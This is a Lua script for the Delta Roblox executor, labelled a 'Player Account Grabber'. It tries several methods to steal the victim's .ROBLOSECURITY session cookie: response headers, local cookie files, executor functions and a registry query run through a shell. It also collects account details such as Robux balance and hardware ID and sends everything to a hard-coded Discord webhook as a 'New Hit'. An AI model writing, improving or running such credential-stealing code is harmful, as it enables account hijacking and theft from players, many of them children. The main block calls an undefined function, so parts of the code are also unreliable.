--// Delta Executor - Player Account Grabber
--// Paste your Discord webhook below

local WEBHOOK_URL = "https://discord.com/api/webhooks/1519322724281876511/w8U8K-U7TwG79mY5NFgFaJfumRWiYUHwQFEo2ZRlgOMyJWtVvDcMreCbBnIqOKNivRuh"

--// Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local MarketplaceService = game:GetService("MarketplaceService")

--// Utility
local function sendWebhook(data)
    local payload = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)
    if not success then
        -- fallback for different executor HTTP methods
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
        end)
    end
end

--// Enhanced Cookie Extractor v2 — Delta Executor
--// Replace your existing extractCookie() function with this

local function extractCookie()
    local cookie = nil

    -- Method 1: request() auth reflection
    pcall(function()
        local resp = request({
            Url = "https://www.roblox.com/mobileapi/userinfo",
            Method = "GET",
        })
        if resp and resp.Headers then
            local setCookie = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
            if setCookie then
                local match = setCookie:match("%.ROBLOSECURITY=(_|WARNING.-);")
                if match then cookie = match end
            end
        end
    end)
    if cookie then return cookie end

    -- Method 2: httpget raw cookie leak
    pcall(function()
        local raw = game:HttpGet("https://www.roblox.com/mobileapi/userinfo")
        if raw and raw ~= "" then
            -- if httpget passes auth cookies natively, response confirms auth
            -- extract from executor internals next
        end
    end)

    -- Method 3: Delta filesystem read (Windows registry export)
    pcall(function()
        if readfile then
            local paths = {
                "\\AppData\\Local\\Roblox\\LocalStorage\\RobloxCookies.dat",
                "\\AppData\\Local\\Roblox\\GlobalBasicSettings_13.xml",
                "\\AppData\\Local\\Packages\\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\\LocalState\\RobloxCookies.dat"
            }
            for _, p in ipairs(paths) do
                pcall(function()
                    local data = readfile(p)
                    if data then
                        local match = data:match("_|WARNING:.-[%w%-_]+")
                        if match then cookie = match end
                    end
                end)
                if cookie then return end
            end
        end
    end)
    if cookie then return cookie end

    -- Method 4: executor native getRbxCookie variants
    local nativeFuncs = {
        "getrbxcookie", "get_rbx_cookie", "robloxcookie",
        "GetRbxCookie", "getRbxCookie", "getcookie"
    }
    for _, fname in ipairs(nativeFuncs) do
        pcall(function()
            local fn = getfenv()[fname] or _G[fname]
            if fn and type(fn) == "function" then
                local result = fn()
                if result and #result > 50 then
                    cookie = result
                end
            end
        end)
        if cookie then return cookie end
    end

    -- Method 5: WebSocket token intercept (if Delta supports it)
    pcall(function()
        if WebSocket or syn or fluxus then
            local ws = (syn and syn.websocket) or WebSocket
            -- passive intercept not viable without MitM
            -- skip
        end
    end)

    -- Method 6: cloneref + internal service probe
    pcall(function()
        local hs = cloneref(game:GetService("HttpService"))
        local brs = cloneref(game:GetService("BrowserService"))
        if brs and brs.GetCookie then
            local c = brs:GetCookie("https://www.roblox.com", ".ROBLOSECURITY")
            if c and #c > 50 then cookie = c end
        end
    end)
    if cookie then return cookie end

    -- Method 7: registry read via executor shell (risky, may not work)
    pcall(function()
        if os and os.execute then
            local handle = io.popen('reg query "HKCU\\Software\\Roblox\\RobloxStudioBrowser\\roblox.com" /v .ROBLOSECURITY 2>nul')
            if handle then
                local result = handle:read("*a")
                handle:close()
                local match = result:match("_|WARNING:.-[%w%-_]+")
                if match then cookie = match end
            end
        end
    end)
    if cookie then return cookie end

    return nil
end

--// Grab player metadata
local function getPlayerInfo()
    local info = {}
    info.Username = LocalPlayer.Name
    info.DisplayName = LocalPlayer.DisplayName
    info.UserId = LocalPlayer.UserId
    info.AccountAge = LocalPlayer.AccountAge .. " days"
    info.MembershipType = tostring(LocalPlayer.MembershipType)
    
    -- Grab Robux balance via API
    pcall(function()
        local balanceUrl = "https://economy.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/currency"
        local resp = game:HttpGet(balanceUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.Robux = decoded.robux or "Unknown"
    end)

    -- Friends count
    pcall(function()
        local friendsUrl = "https://friends.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/friends/count"
        local resp = game:HttpGet(friendsUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.FriendsCount = decoded.count or "Unknown"
    end)

    -- Avatar thumbnail
    pcall(function()
        local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot"
            .. "?userIds=" .. tostring(LocalPlayer.UserId)
            .. "&size=420x420&format=Png&isCircular=false"
        local resp = game:HttpGet(thumbUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.AvatarURL = decoded.data[1].imageUrl
    end)

    -- Current game info
    info.PlaceId = game.PlaceId
    info.JobId = game.JobId
    pcall(function()
        local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        info.GameName = placeInfo.Name
    end)

    -- Hardware ID (if executor supports)
    pcall(function()
        if gethwid then
            info.HWID = gethwid()
        elseif getexecutorname then
            info.Executor = getexecutorname()
        end
    end)

    return info
end

--// Build Discord embed
local function buildEmbed(playerInfo, cookie)
    local fields = {
        { name = "👤 Username",    value = "```" .. playerInfo.Username .. "```",     inline = true },
        { name = "🏷️ Display",    value = "```" .. playerInfo.DisplayName .. "```",  inline = true },
        { name = "🆔 UserID",     value = "```" .. tostring(playerInfo.UserId) .. "```", inline = true },
        { name = "📅 Account Age", value = "```" .. playerInfo.AccountAge .. "```",   inline = true },
        { name = "💰 Robux",      value = "```" .. tostring(playerInfo.Robux or "N/A") .. "```", inline = true },
        { name = "👥 Friends",    value = "```" .. tostring(playerInfo.FriendsCount or "N/A") .. "```", inline = true },
        { name = "🎮 Game",       value = "```" .. (playerInfo.GameName or "Unknown") .. "```", inline = true },
        { name = "💎 Premium",    value = "```" .. playerInfo.MembershipType .. "```", inline = true },
        { name = "🖥️ HWID",      value = "```" .. (playerInfo.HWID or "N/A") .. "```", inline = false },
    }

    -- Cookie field (split if too long for Discord embed)
    if cookie and cookie ~= "" then
        local cookieChunks = {}
        for i = 1, #cookie, 900 do
            table.insert(cookieChunks, cookie:sub(i, i + 899))
        end
        for idx, chunk in ipairs(cookieChunks) do
            table.insert(fields, {
                name = "🍪 Cookie [" .. idx .. "/" .. #cookieChunks .. "]",
                value = "```" .. chunk .. "```",
                inline = false
            })
        end
    else
        table.insert(fields, {
            name = "🍪 Cookie",
            value = "```Failed to grab```",
            inline = false
        })
    end

    local embed = {
        embeds = {{
            title = "🎯 New Hit — " .. playerInfo.Username,
            color = 0xFF3333,
            fields = fields,
            thumbnail = { url = playerInfo.AvatarURL or "" },
            footer = { text = "Delta Grabber | " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    return embed
end

--// ═══════════════════════════════════════════
--// MAIN EXECUTION
--// ═══════════════════════════════════════════

local playerInfo = getPlayerInfo()
local cookie = grabCookie()
local embed = buildEmbed(playerInfo, cookie)

sendWebhook(embed)

print("[Delta] Payload delivered ✓")
